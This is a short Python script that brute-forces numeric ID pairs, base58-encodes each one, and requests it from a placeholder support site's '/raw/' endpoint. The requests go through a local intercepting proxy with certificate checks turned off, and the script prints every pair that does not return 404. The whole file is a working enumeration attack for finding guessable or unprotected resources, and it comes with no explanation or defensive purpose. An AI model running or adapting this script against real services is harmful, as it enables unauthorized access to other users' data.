import random
import string
import re
import urllib
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

proxy = {
    'https': 'http://127.0.0.1:8085',
    'http': 'http://127.0.0.1:8085'
}

from base58 import b58encode

def tryString(string):
    return requests.get(b"https://support.SITE/raw/" + b58encode(string), proxies=proxy, verify=False).status_code != 404

result = False
import sys
v = None
try:
    v = int(sys.argv[1])
except:
    pass

pair = [v or 0, 0]
while True:
    combination = ":".join(map(str,pair))
    if tryString(combination):
        print(pair)
    if v is None:
        pair[0] += 1
    else:
        pair[1] += 1